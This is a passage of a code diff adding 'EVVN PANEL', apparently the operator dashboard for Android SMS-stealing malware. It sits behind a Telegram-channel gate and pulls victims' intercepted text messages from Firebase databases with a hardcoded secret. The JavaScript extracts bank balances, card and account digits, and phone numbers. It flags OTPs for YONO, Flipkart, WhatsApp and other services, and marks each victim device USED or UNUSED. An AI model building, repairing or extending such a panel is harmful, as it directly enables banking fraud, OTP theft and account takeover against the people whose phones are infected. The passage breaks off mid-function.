+.sms-foot b{color:var(--gold-2);font-weight:700;font-family:var(--font-mono)}
+
+.confirm-box{background:linear-gradient(160deg,var(--card) 0%,var(--bg-2) 100%);border:1px solid var(--border-2);border-radius:var(--radius-lg);padding:24px;max-width:360px;width:100%;text-align:center;animation:popIn .2s ease-out;box-shadow:var(--shadow)}
+@keyframes popIn{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
+.confirm-box .title{font-family:var(--font-display);font-size:15px;font-weight:700;margin-bottom:10px;color:var(--gold-2)}
+.confirm-box .desc{font-size:13px;color:var(--text-2);line-height:1.6;margin-bottom:22px}
+.confirm-box .desc b{color:var(--gold-2);font-weight:700;font-family:var(--font-mono);font-size:12px}
+.confirm-actions{display:flex;gap:10px}
+.confirm-actions button{flex:1;padding:12px;border-radius:10px;font-size:12.5px;font-weight:700;letter-spacing:.3px;transition:all .2s}
+.confirm-actions .cancel{background:var(--bg-2);border:1px solid var(--border);color:var(--text-2)}
+.confirm-actions .cancel:hover{color:var(--text);border-color:var(--border-2)}
+.confirm-actions .ok{background:var(--danger);color:#fff}
+.confirm-actions .ok.restore{background:var(--success);color:#0a0806}
+.confirm-actions .ok:hover{opacity:.9;transform:translateY(-1px)}
+
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(90px);background:var(--card);border:1px solid var(--border-2);color:var(--text);padding:12px 20px;border-radius:24px;font-size:13px;font-weight:600;z-index:5000;transition:transform .25s ease;max-width:90%;text-align:center;pointer-events:none;box-shadow:var(--shadow);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.toast.show{transform:translateX(-50%) translateY(0)}
+.toast.ok{background:var(--success);border-color:var(--success);color:#0a0806}
+.toast.err{background:var(--danger);border-color:var(--danger);color:#fff}
+.toast.warn{background:var(--warning);border-color:var(--warning);color:#1a1308}
+
+@media (max-width:640px){
+  .topbar{padding:12px 16px;gap:12px;flex-wrap:wrap}
+  .search{order:3;flex-basis:100%;max-width:none}
+  .brand-name{font-size:13.5px}
+  .stats{padding:12px 16px 8px;gap:10px}
+  .stat{padding:12px 14px}
+  .stat .val{font-size:20px}
+  .stat .lbl{font-size:9.5px}
+  .actions{padding:10px 16px;gap:10px}
+  .action-btn{padding:10px;font-size:12px}
+  .filters{padding:10px 16px}
+  .brand-scroll-wrap{padding:12px 16px}
+  .h-brand-chip{padding:8px 14px;font-size:12px}
+  .brand-head{padding:14px 16px;gap:10px}
+  .brand-icon-box{width:36px;height:36px;font-size:10px}
+  .brand-title .bt{font-size:13.5px}
+  .brand-title .bs{font-size:10.5px}
+  .brand-count{padding:5px 10px;font-size:10px}
+  .brand-body{padding:10px 16px 18px}
+  .grid{grid-template-columns:1fr;gap:10px}
+  .card{padding:14px}
+  .d-panel{max-width:100%}
+  .modal{padding:18px;border-radius:14px}
+  .gate-card{padding:28px 22px}
+}
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.001ms!important;transition-duration:.001ms!important}
+}
+</style>
+</head>
+<body>
+
+<!-- ============ GATE ============ -->
+<div id="gate">
+  <div class="gate-card">
+    <div class="gate-brand">
+      <div class="logo-slot">
+        <img src="logo.png" alt="EVVN PANEL">
+      </div>
+      <div>
+        <div class="name">EVVN PANEL</div>
+        <div class="sub">Verification Required</div>
+      </div>
+    </div>
+    <div class="gate-title">Access Verification</div>
+    <div class="gate-desc">
+      To access this panel, you must join the official Telegram channel below. Access will be granted once the requirement is fulfilled.
+    </div>
+
+    <div class="chan-list">
+      <div class="chan-item" data-ch="1">
+        <div class="chk">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="cinfo">
+          <div class="cname">Official Channel</div>
+          <div class="curl">t.me/+Kr_lfBgaqGdmM2E1</div>
+        </div>
+        <a class="cbtn" href="https://t.me/ANON_PANEL" target="_blank" rel="noopener" data-join="1">Join</a>
+      </div>
+    </div>
+
+    <div class="gate-progress">
+      <span id="gateProgressTxt">0 / 1 channels verified</span>
+      <div class="bar"><div class="bar-inner" id="gateBar"></div></div>
+    </div>
+
+    <button class="gate-continue" id="gateContinue" disabled>Continue to Panel</button>
+    <div class="gate-foot">EVVN PANEL · Secure Access Control</div>
+  </div>
+</div>
+
+<!-- ============ APP ============ -->
+<div class="app" id="app">
+
+  <header class="topbar">
+    <div class="brand">
+      <div class="logo-slot">
+        <img src="logo.png" alt="EVVN PANEL">
+      </div>
+      <div class="brand-text">
+        <div class="brand-name">EVVN PANEL</div>
+        <div class="brand-sub">Control Panel</div>
+      </div>
+    </div>
+    <div class="search">
+      <span class="search-ico">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      </span>
+      <input type="text" id="searchInput" placeholder="Search devices…" />
+    </div>
+    <button class="icon-btn" id="sourcesBtn" title="Sources">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+    </button>
+  </header>
+
+  <div class="stats">
+    <div class="stat total"><div class="lbl">Total</div><div class="val" id="sTotal">0</div></div>
+    <div class="stat online"><div class="lbl">Online</div><div class="val" id="sOnline">0</div></div>
+    <div class="stat offline"><div class="lbl">Offline</div><div class="val" id="sOffline">0</div></div>
+    <div class="stat bank"><div class="lbl">Bank</div><div class="val" id="sBank">0</div></div>
+  </div>
+
+  <div class="actions">
+    <button class="action-btn" id="allSmsBtn">
+      <span class="ico">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+      </span>
+      All Messages
+      <span class="badge" id="allSmsBadge" style="display:none">0</span>
+    </button>
+    <button class="action-btn" id="starredBtn">
+      <span class="ico">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+      </span>
+      Starred
+      <span class="badge" id="starredBadge" style="display:none">0</span>
+    </button>
+  </div>
+
+  <div class="filters" id="filterbar">
+    <button class="filter-chip active" data-f="all">All</button>
+    <button class="filter-chip" data-f="online">Online</button>
+    <button class="filter-chip" data-f="offline">Offline</button>
+    <button class="filter-chip" data-f="upi">UPI</button>
+    <button class="filter-chip" data-f="bank">Bank</button>
+    <button class="filter-chip" data-f="card">Card</button>
+    <div class="sep"></div>
+    <select id="sortSel">
+      <option value="newest">Newest</option>
+      <option value="oldest">Oldest</option>
+      <option value="name">Name</option>
+      <option value="battery">Battery</option>
+    </select>
+    <button class="icon-btn" id="refreshBtn" title="Refresh" style="width:34px;height:34px">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+    </button>
+    <button class="icon-btn" id="shareBtn" title="Share" style="width:34px;height:34px">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+    </button>
+    <button class="icon-btn" id="hiddenBtn" title="Hidden" style="width:34px;height:34px">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+    </button>
+    <button class="icon-btn" id="disconnectBtn" title="Disconnect" style="width:34px;height:34px">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+  </div>
+
+  <!-- HORIZONTAL BRAND CHIPS -->
+  <div class="brand-scroll-wrap" id="brandScrollWrap">
+    <!-- injected via JS -->
+  </div>
+
+  <main id="sectionsRoot"></main>
+
+  <div class="foot">EVVN PANEL · Control Panel · Live Session</div>
+</div>
+
+<div id="detailRoot"></div>
+<div id="modalRoot"></div>
+<div id="confirmRoot"></div>
+<div class="toast" id="toast"></div>
+
+<script>
+(function(){
+'use strict';
+
+var NODE_SECRET = 'rolex';
+var CH1_KEY = 'EVVN_ch1_verified';
+var SESSION_KEY = 'EVVN_session_open';
+
+// ============ GATE ============
+(function initGate(){
+  var gate = document.getElementById('gate');
+  var app = document.getElementById('app');
+  var contBtn = document.getElementById('gateContinue');
+  var barEl = document.getElementById('gateBar');
+  var txtEl = document.getElementById('gateProgressTxt');
+
+  function getVerified(){
+    return {
+      c1: sessionStorage.getItem(CH1_KEY) === '1'
+    };
+  }
+  function updateUI(){
+    var v = getVerified();
+    var done = (v.c1 ? 1 : 0);
+    barEl.style.width = (done / 1 * 100) + '%';
+    txtEl.textContent = done + ' / 1 channels verified';
+    document.querySelector('.chan-item[data-ch="1"]').classList.toggle('done', v.c1);
+    contBtn.disabled = !v.c1;
+  }
+  document.querySelectorAll('[data-join]').forEach(function(a){
+    a.addEventListener('click', function(){
+      var ch = this.getAttribute('data-join');
+      if(ch === '1') sessionStorage.setItem(CH1_KEY,'1');
+      setTimeout(updateUI, 100);
+    });
+  });
+  contBtn.addEventListener('click', function(){
+    var v = getVerified();
+    if(!v.c1) return;
+    sessionStorage.setItem(SESSION_KEY,'1');
+    gate.classList.add('hidden');
+    app.classList.add('ready');
+    bootApp();
+  });
+  updateUI();
+
+  if(sessionStorage.getItem(SESSION_KEY) === '1'){
+    gate.classList.add('hidden');
+    app.classList.add('ready');
+    bootApp();
+  }
+})();
+
+// ============ HELPERS ============
+function esc(s){
+  if(s === null || s === undefined) return '';
+  return String(s).replace(/[&<>"']/g, function(c){
+    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
+  });
+}
+function toast(msg, type){
+  type = type || '';
+  var t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast ' + type;
+  requestAnimationFrame(function(){ t.classList.add('show'); });
+  clearTimeout(t._t);
+  t._t = setTimeout(function(){ t.classList.remove('show'); }, 2200);
+}
+function fmtTime(ts){
+  if(!ts) return '';
+  var d = new Date(ts);
+  if(isNaN(d.getTime())) return '';
+  return d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true});
+}
+function fmtDate(ts){
+  if(!ts) return 'Unknown';
+  var d = new Date(ts);
+  if(isNaN(d.getTime())) return 'Unknown';
+  var now = new Date();
+  var today = new Date(now.getFullYear(),now.getMonth(),now.getDate());
+  var yest = new Date(today); yest.setDate(yest.getDate()-1);
+  var day = new Date(d.getFullYear(),d.getMonth(),d.getDate());
+  if(day.getTime() === today.getTime()) return 'Today · ' + d.toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});
+  if(day.getTime() === yest.getTime()) return 'Yesterday · ' + d.toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});
+  return d.toLocaleDateString('en-IN',{weekday:'long',day:'2-digit',month:'short',year:'numeric'});
+}
+function parseTimestamp(val, key){
+  if(typeof val === 'number' && isFinite(val)){
+    if(val > 1e12) return val;
+    if(val > 1e9) return val*1000;
+    return val;
+  }
+  if(typeof val === 'string' && val.trim()){
+    var s = val.trim();
+    if(/^\d+$/.test(s)){
+      var n = parseInt(s,10);
+      if(n > 1e12) return n;
+      if(n > 1e9) return n*1000;
+      return n;
+    }
+    var d = new Date(s);
+    if(!isNaN(d.getTime())) return d.getTime();
+    var m = s.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{2,4})(?:[\s,T]+(\d{1,2}):(\d{2})(?::(\d{2}))?)?/);
+    if(m){
+      var y = parseInt(m[3],10); if(y<100) y+=2000;
+      var dt = new Date(y,parseInt(m[2],10)-1,parseInt(m[1],10),parseInt(m[4]||0,10),parseInt(m[5]||0,10),parseInt(m[6]||0,10));
+      if(!isNaN(dt.getTime())) return dt.getTime();
+    }
+    var tm = s.match(/^(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)?$/i);
+    if(tm){
+      var hh=parseInt(tm[1],10), mm=parseInt(tm[2],10), ss=parseInt(tm[3]||0,10);
+      var ap=(tm[4]||'').toUpperCase();
+      if(ap==='PM' && hh<12) hh+=12;
+      if(ap==='AM' && hh===12) hh=0;
+      var now = new Date();
+      return new Date(now.getFullYear(),now.getMonth(),now.getDate(),hh,mm,ss).getTime();
+    }
+  }
+  if(key){
+    var kn = parseInt(key,10);
+    if(!isNaN(kn) && isFinite(kn)) return kn;
+  }
+  return 0;
+}
+
+// ============ STATE ============
+var sources, blacklist, stars, devices, filtered, phoneCache, allSmsCache, brandCache;
+var currentFilter, currentSort, searchQ, showHidden;
+var activeBrand = 'yono';
+var selectedDevice, detailTab, smsMsgs, smsData, simSel;
+var fetchInt, detailSmsInt, enrichRunning, fetchInProgress;
+var lastGridSig, lastStatsSig, lastBrandSig;
+
+var $brandScroll, $sectionsRoot, $detailRoot, $modalRoot, $confirmRoot;
+
+var SRC_KEY = 'EVVN_sources_v1';
+var BL_KEY = 'EVVN_blacklist_v1';
+var STAR_KEY = 'EVVN_stars_v1';
+var PHONE_CACHE_KEY = 'EVVN_phone_cache_v1';
+var ALL_SMS_CACHE_KEY = 'EVVN_all_sms_v1';
+var BRAND_CACHE_KEY = 'EVVN_brand_cache_v1';
+
+// ============ BRANDS ============
+var BRANDS = [
+  { 
+    key:'yono',   
+    label:'YONO (Camial, Fetnow etc)',  
+    short:'YONO', 
+    cls:'brand-yono',   
+    regex:/(?:camial|fetnow|rouven|baxrwc|yono|pvr|oyorooms|oyo)/i,
+    requireOtp: true
+  },
+  { key:'meesho',   label:'MEESHO',      short:'MEE', cls:'brand-meesho',   regex:/\bmeesho\b/i },
+  { key:'whatsapp', label:'WHATSAPP',    short:'WSP', cls:'brand-whatsapp', regex:/\bwhatsapp\b/i },
+  { key:'indane',   label:'INDANE GAS',  short:'IND', cls:'brand-indane',   regex:/\bindane\b/i },
+  { key:'flipkart', label:'FLIPKART',    short:'FLP', cls:'brand-flipkart', regex:/\bflipkart\b/i }
+];
+
+// ============ STORAGE ============
+function loadSrc(){
+  try{
+    var r = localStorage.getItem(SRC_KEY);
+    if(!r) return [];
+    var a = JSON.parse(r);
+    if(!Array.isArray(a)) return [];
+    return a.map(function(s,i){
+      return {id:s.id||('SRC-'+(1000+i+1)),url:s.url,secret:s.secret||NODE_SECRET,tag:s.tag||makeTag(s.url),notes:s.notes||'',status:'pending'};
+    });
+  }catch(e){ return []; }
+}
+function saveSrc(){ try{ localStorage.setItem(SRC_KEY, JSON.stringify(sources)); }catch(e){} }
+function clearSrc(){ try{ localStorage.removeItem(SRC_KEY); }catch(e){} }
+function loadBL(){ try{ var r=localStorage.getItem(BL_KEY); return r?JSON.parse(r):[]; }catch(e){ return []; } }
+function saveBL(){ try{ localStorage.setItem(BL_KEY,JSON.stringify(blacklist)); }catch(e){} }
+function loadStars(){ try{ var r=localStorage.getItem(STAR_KEY); return r?JSON.parse(r):{}; }catch(e){ return {}; } }
+function saveStars(){ try{ localStorage.setItem(STAR_KEY,JSON.stringify(stars)); }catch(e){} }
+function loadPhoneCache(){ try{ phoneCache = JSON.parse(localStorage.getItem(PHONE_CACHE_KEY)||'{}'); }catch(e){ phoneCache={}; } }
+var _pcT=null;
+function savePhoneCache(){
+  if(_pcT) clearTimeout(_pcT);
+  _pcT = setTimeout(function(){
+    _pcT=null;
+    try{ localStorage.setItem(PHONE_CACHE_KEY,JSON.stringify(phoneCache)); }catch(e){}
+  },600);
+}
+function loadAllSmsCache(){ try{ allSmsCache = JSON.parse(localStorage.getItem(ALL_SMS_CACHE_KEY)||'{}'); }catch(e){ allSmsCache={}; } }
+var _asT=null;
+function saveAllSmsCache(){
+  if(_asT) clearTimeout(_asT);
+  _asT = setTimeout(function(){
+    _asT=null;
+    try{ localStorage.setItem(ALL_SMS_CACHE_KEY,JSON.stringify(allSmsCache)); }catch(e){}
+  },1000);
+}
+function loadBrandCache(){ try{ brandCache = JSON.parse(localStorage.getItem(BRAND_CACHE_KEY)||'{}'); }catch(e){ brandCache={}; } }
+var _bcT=null;
+function saveBrandCache(){
+  if(_bcT) clearTimeout(_bcT);
+  _bcT = setTimeout(function(){
+    _bcT=null;
+    try{ localStorage.setItem(BRAND_CACHE_KEY,JSON.stringify(brandCache)); }catch(e){}
+  },800);
+}
+
+// ============ HELPERS ============
+function makeTag(url){
+  if(!url) return 'unknown';
+  return url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'').replace(/\.firebasedatabase\.app.*/,'').substring(0,20);
+}
+function normUrl(u){
+  if(!u) return null;
+  u = String(u).trim().split('?')[0].replace(/\/+$/,'');
+  if(!u) return null;
+  if(!/^https?:\/\//i.test(u)) u = 'https://' + u;
+  return u;
+}
+function genId(){ return 'SRC-' + Math.floor(1000+Math.random()*9000); }
+function parseBat(v){
+  if(!v) return {p:0,l:'—'};
+  var s = String(v).replace('%','').trim();
+  var n = parseInt(s);
+  if(isNaN(n)) return {p:0,l:s};
+  return {p:Math.min(Math.max(n,0),100),l:n+'%'};
+}
+function batColor(p){
+  if(p >= 60) return '#3ecf8e';
+  if(p >= 30) return '#f59e0b';
+  return '#ef4444';
+}
+function cacheKey(d){ return d._srcUrl + '::' + d.id; }
+function dkey(d){ return d.id + '::' + (d._srcUrl || ''); }
+function isBL(d){ return blacklist.indexOf(dkey(d)) !== -1; }
+function addBL(d){ var k=dkey(d); if(blacklist.indexOf(k)===-1){blacklist.push(k);saveBL();} }
+function rmBL(d){ var k=dkey(d); var i=blacklist.indexOf(k); if(i!==-1){blacklist.splice(i,1);saveBL();} }
+function isStar(d){ return !!stars[dkey(d)]; }
+function toggleStar(d){ var k=dkey(d); if(stars[k]) delete stars[k]; else stars[k]=1; saveStars(); }
+
+// ===== FAST phone extraction =====
+var PHONE_FIELDS = ['phoneNumber','number','mobNo','phone','simNumber','msisdn','phoneNo','mobile','simNo','devicePhone','sim1Number','sim2Number','phone_number','mobile_no','contactNumber'];
+function extractPhoneFromNode(dev, sims){
+  if(Array.isArray(sims) && sims.length > 0){
+    for(var i=0;i<sims.length;i++){
+      var s = sims[i]; if(!s||typeof s!=='object') continue;
+      for(var j=0;j<PHONE_FIELDS.length;j++){
+        var v = s[PHONE_FIELDS[j]];
+        if(v && String(v).trim() && String(v).trim()!=='—') return String(v).trim();
+      }
+    }
+  }
+  if(sims && typeof sims === 'object' && !Array.isArray(sims)){
+    for(var k in sims){
+      var sv = sims[k]; if(!sv||typeof sv!=='object') continue;
+      for(var c=0;c<PHONE_FIELDS.length;c++){
+        var v2 = sv[PHONE_FIELDS[c]];
+        if(v2 && String(v2).trim() && String(v2).trim()!=='—') return String(v2).trim();
+      }
+    }
+  }
+  for(var r=0;r<PHONE_FIELDS.length;r++){
+    var v3 = dev[PHONE_FIELDS[r]];
+    if(v3 && String(v3).trim() && String(v3).trim()!=='—') return String(v3).trim();
+  }
+  return null;
+}
+function extractNetworkFromNode(dev, sims){
+  if(Array.isArray(sims) && sims.length > 0){
+    for(var i=0;i<sims.length;i++){
+      var s = sims[i]; if(!s) continue;
+      var c = s.carrierName||s.network||s.operator||s.carrier;
+      if(c && String(c).trim()) return String(c).trim();
+    }
+  }
+  if(dev.network && String(dev.network).trim()) return String(dev.network).trim();
+  if(dev.carrierName && String(dev.carrierName).trim()) return String(dev.carrierName).trim();
+  return null;
+}
+
+// ============ FETCH SMS (LIMIT 1000) ============
+async function fetchSmsRaw(id, url, sec, signal){
+  if(!url || !sec) return [];
+  var full = url + '/messages/' + id + '.json?auth=' + encodeURIComponent(sec) + '&orderBy="$key"&limitToLast=1000';
+  try{
+    var r = await fetch(full, signal ? {signal:signal} : undefined);
+    if(!r.ok) return [];
+    var d = await r.json();
+    if(!d || typeof d !== 'object') return [];
+    var list = [];
+    var keys = Object.keys(d);
+    for(var i=0;i<keys.length;i++){
+      var key = keys[i];
+      var m = d[key];
+      if(!m || typeof m !== 'object') continue;
+      var text = m.message || m.text || m.body;
+      if(!text) continue;
+      var tsVal = m.dateTime || m.date || m.timestamp || m.time || m.date_time || m.created_at || m.sentAt || 0;
+      var ts = parseTimestamp(tsVal, key);
+      var dispTime = '';
+      if(m.dateTime) dispTime = String(m.dateTime);
+      else if(m.date) dispTime = String(m.date);
+      else if(m.timestamp) dispTime = String(m.timestamp);
+      else if(m.time) dispTime = String(m.time);
+      else if(ts > 0){
+        try{ dispTime = new Date(ts).toLocaleString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true,day:'2-digit',month:'short'}); }catch(e){}
+      }
+      list.push({
+        text: String(text),
+        sender: m.sender || m.from || m.address || 'Unknown',
+        time: dispTime,
+        _ts: ts,
+        _key: key
+      });
+    }
+    list.sort(function(a,b){
+      if(b._ts !== a._ts) return b._ts - a._ts;
+      return String(b._key).localeCompare(String(a._key));
+    });
+    return list;
+  }catch(e){
+    if(e && e.name === 'AbortError') throw e;
+    return [];
+  }
+}
+
+// ============ FAST phone from SMS ============
+var PHONE_RE_SMS = /(?:\+91[\s-]?)?([6-9]\d{9})\b/;
+function extractPhoneFromSmsText(text){
+  if(!text) return null;
+  var m = text.match(PHONE_RE_SMS);
+  if(!m) return null;
+  return m[1];
+}
+
+// ============ BRAND MATCH (STRICT OTP LOGIC) ============
+var OTP_KEYWORDS = /(?:otp|verification|verify|login|code|passcode|password|auth|security)/i;
+function matchBrands(msgs){
+  var hits = {};
+  for(var b=0;b<BRANDS.length;b++) hits[BRANDS[b].key] = false;
+  if(!msgs || !msgs.length) return hits;
+  
+  for(var i=0;i<msgs.length;i++){
+    var t = msgs[i].text || '';
+    var isOtp = OTP_KEYWORDS.test(t);
+    for(var b=0;b<BRANDS.length;b++){
+      if(!hits[BRANDS[b].key] && BRANDS[b].regex.test(t)){
+        if(BRANDS[b].requireOtp){
+          if(isOtp){
+            hits[BRANDS[b].key] = true;
+          }
+        } else {
+          hits[BRANDS[b].key] = true;
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+// ============ ANALYZE SMS ============
+function analyzeSms(msgs){
+  var bank=[],cards=[],phones=[],nets=[];
+  for(var i=0;i<msgs.length;i++){
+    var t = msgs[i].text || '';
+    var bm = t.match(/(?:Avl|Bal|Available)\s*(?:Bal|Balance)?\s*[:\-]?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i)
+           || t.match(/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:Avl|Bal|Balance)/i);
+    if(bm){
+      var bn = t.match(/HDFC|SBI|ICICI|AXIS|KOTAK|PNB|BOI|CANARA|UNION|YES|IDBI|INDUS|FEDERAL|RBL|PAYTM|PHONEPE|GPAY|IPBMSG/i);
+      var txType = /credit/i.test(t) ? 'credit' : (/debit|withdraw|spent|purchase/i.test(t) ? 'debit' : '');
+      var txAmt = '';
+      var am = t.match(/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:debited|credited|withdrawn|deposited|spent)/i)
+             || t.match(/(?:debited|credited|withdrawn|deposited|spent)\s*(?:by|with|for)?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i);
+      if(am) txAmt = am[1].replace(/,/g,'');
+      var accM = t.match(/([xX*]{0,4}[0-9]{4})\b/);
+      bank.push({
+        bankName: bn ? bn[0] : 'Bank',
+        availableBalance: bm[1].replace(/,/g,''),
+        accountLast4: accM ? accM[1].slice(-4) : '',
+        transactionType: txType,
+        transactionAmount: txAmt,
+        rawSms: t.substring(0,140)
+      });
+    }
+    var cm = t.match(/card[\s:]*([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i) || t.match(/[xX*]{4,}([0-9]{4})/);
+    if(cm){
+      var ct = t.match(/VISA|MASTER|RUPAY|AMEX/i);
+      cards.push({cardLast4: cm[1].replace(/\s/g,'').slice(-4), cardType: ct ? ct[0] : 'Card'});
+    }
+    var pm = t.match(PHONE_RE_SMS);
+    if(pm){
+      var num = pm[1];
+      if(num && num.length === 10 && /^[6-9]/.test(num) && phones.indexOf(num) === -1) phones.push(num);
+    }
+    var nm = t.match(/Jio|Airtel|Vodafone|Idea|BSNL|Vi/i);
+    if(nm && nets.indexOf(nm[0]) === -1) nets.push(nm[0]);
+  }
+  return {bankBalances:bank, cards:cards, phoneNumbers:phones, networks:nets};
+}
+
+// ============ RENDER ONE CARD ============
+function renderCard(d, brand){
+  var bat = parseBat(d.battery);
+  var on = d.status;
+  var bank = d.sms.bankBalances || [];
+  var nets = d.sms.networks || [];
+  var net = d.network || (nets.length > 0 ? nets[0] : null);
+  var phone = d.mobNo && d.mobNo !== '—' ? d.mobNo : null;
+  var hid = isBL(d);
+  var starred = isStar(d);
+  var android = d.androidV && d.androidV !== '—' ? d.androidV : '—';
+  var enrichPending = !phone && d._srcUrl && d._srcSec && !phoneCache[cacheKey(d)];
+
+  var phoneHtml = phone
+    ? '<div class="v mono">' + esc(phone) + '</div>'
+    : (enrichPending ? '<div class="v fetching">Fetching…</div>' : '<div class="v muted">—</div>');
+  var netHtml = net
+    ? '<div class="v">' + esc(net) + '</div>'
+    : (enrichPending ? '<div class="v fetching">Fetching…</div>' : '<div class="v muted">—</div>');
+
+  var batClr = batColor(bat.p);
+
+  var bankHtml = '';
+  if(bank.length > 0){
+    var b = bank[0];
+    var txHtml = '';
+    if(b.transactionType && b.transactionAmount){
+      var cls = b.transactionType === 'credit' ? 'credit' : 'debit';
+      var sign = b.transactionType === 'credit' ? '+' : '−';
+      txHtml = '<div class="txn ' + cls + '">' + sign + ' ₹' + esc(b.transactionAmount) + ' · ' + b.transactionType + '</div>';
+    }
+    bankHtml = '<div class="bank-box">'
+      + '<div class="row1">'
+      + '<div class="bank">'
+      + '<div class="bank-logo">₹</div>'
+      + '<span class="bank-name">' + esc(b.bankName || 'Bank') + '</span>'
+      + (b.accountLast4 ? '<span class="bank-acc">··' + esc(b.accountLast4) + '</span>' : '')
+      + '</div>'
+      + '<div class="bank-amt">₹' + esc(b.availableBalance || '0') + '</div>'
+      + '</div>' + txHtml + '</div>';
+  }
+
+  var brandTagHtml = '';
+  if(brand){
+    var bc = brandCache[dkey(d)];
+    var isUsed = !!(bc && bc[brand.key]);
+    brandTagHtml = '<span class="card-tag ' + (isUsed ? 'used' : 'unused') + '">' + (isUsed ? 'USED' : 'UNUSED') + '</span>';
+  }
+
+  return '<div class="card ' + (on ? 'online' : 'offline') + (hid ? ' blacklisted' : '') + '" data-id="' + esc(d.id) + '" data-src="' + esc(d._srcUrl) + '">'
+    + '<div class="card-head">'
+    + '<div class="dev-ico">'
+    + '<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>'
+    + '</div>'
+    + '<div class="dev-info">'
+    + '<div class="dev-name">' + esc(d.name) + brandTagHtml + '</div>'
+    + '<div class="dev-id">' + esc(d.id) + '</div>'
+    + '</div>'
+    + '<div class="cbtns">'
+    + '<button class="sbtn' + (starred ? ' starred' : '') + '" data-star="1" title="Star">'
